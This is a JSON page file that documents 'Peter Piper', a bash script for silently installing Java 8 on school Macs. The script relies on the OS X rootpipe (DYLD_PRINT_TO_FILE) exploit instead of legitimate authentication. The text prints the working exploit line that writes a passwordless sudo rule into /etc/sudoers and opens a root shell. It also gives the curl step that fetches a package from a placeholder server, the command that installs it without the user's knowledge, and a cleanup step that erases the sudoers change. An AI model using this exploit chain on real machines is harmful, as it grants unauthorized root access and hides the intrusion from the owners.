{"name":"Peter Piper","tagline":"A simple Java 8 updater (bash script) for OS X made for Madison Academy. Makes use of the rootpipe exploit.","body":"# Peter Piper Documentation #\r\n\r\n__1. INTRODUCTION__\r\n<br>\r\nThis script was made as an alternative to legitimate authentication in Applescript. This script uses a method of exploitation in OS X called root piping.\r\n\r\n<br>\r\n\r\n__2. EXPLOIT__\r\n<br>\r\nThis exploit uses a vulnerability that was properly fixed in OS X 10.10.5. Itâ€™s reference information is [here](https://www.sektioneins.de/en/blog/15-07-07-dyld_print_to_file_lpe.html).\r\nThis exploit gives whatever user that executes it admin instantly.\r\n\r\n<br>\r\n\r\n__3. INSTALL__\r\n<br>\r\nWe use `cURL` to get the Java 8 Update 60 package onto the target computer and into a temporary directory, then the `installer` command featured in the OS X command line to install the .pkg we fetched. This is the correct command for this particular task because it skips the graphical installer meaning it can run behind the scenes without target knowledge.\r\n\r\n<br>\r\n\r\n__4. CLEANUP__\r\n<br>\r\nWe first remove the temporary directory used to store the Java package during install, then we use the command `sed` to remove the target from the sudoers list.\r\n\r\n<br>\r\n\r\n__5. `function KeepSafe { }` & `trap`__\r\n<br>\r\nThis is used to ensure the completion of the command if it fails.\r\n\r\n<br>\r\n\r\n<br>\r\n\r\n## IN-DEPTH LOOK AT `function KeepSafe { }` COMMANDS ##\r\n\r\n`echo 'echo \"$(whoami) ALL=(ALL) NOPASSWD:ALL\" >&3' | DYLD_PRINT_TO_FILE=/etc/sudoers newgrp;` ___- Exploit the machine___\r\n<br>\r\n`sudo bash -c ` ___- Create a root bash shell___\r\n<br>\r\n`if [[ $EUID -ne 0 ]]; then echo -e \"\\033[1mFailed! No root!\\033[0m $(exit 1)\";` ___- Check if the exploit actually worked, if not, exit the script___\r\n<br>\r\n`sudo mkdir -v /tmp$$;` ___- Make a temporary directory to store the package in___\r\n<br>\r\n`sudo curl -# http://<SERVER_ADDRESS>/Java_8_Update_60.pkg > /tmp$$/Java_8_Update_60.pkg;` ___- Get the package___\r\n<br>\r\n`sudo installer -verbose -pkg /tmp$$/Java_8_Update_60.pkg -target LocalSystem;` - ___Install the package___\r\n<br>\r\n`sudo sed -i \"\" \"/NOPASSWD:ALL/d\" /etc/sudoers;` ___- Remove the line allowing root access without a password___\r\n<br>\r\n`rm -rfv /tmp$$;` ___- Remove the temporary directory___\r\n","google":"","note":"Don't delete this file! It's used internally to help with page regeneration."}